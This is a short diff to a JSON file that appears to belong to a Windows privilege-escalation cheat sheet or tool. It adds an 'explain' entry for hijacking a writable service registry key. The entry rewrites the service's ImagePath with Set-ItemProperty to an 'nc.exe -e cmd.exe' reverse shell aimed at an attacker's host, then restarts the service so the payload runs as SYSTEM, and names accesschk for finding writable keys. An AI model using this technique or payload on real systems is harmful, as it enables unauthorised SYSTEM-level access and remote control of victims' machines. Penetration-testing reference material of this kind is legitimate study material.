@@ -103,5 +103,6 @@
       "label": "Restart the service",
       "command": "sc stop <service> & sc start <service>"
     }
-  ]
+  ],
+  "explain": "Hijacks a service whose registry key you can write by rewriting its ImagePath:\n  Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<service>   the writable service key\n  -Name ImagePath          the value that points to the service executable\n  -Value \"C:\\path\\nc.exe -e cmd.exe <lhost> <lport>\"   replace it with your payload command\nRestart the service and it executes your command as its account (often SYSTEM). accesschk -kvuqsw finds writable service keys."
 }
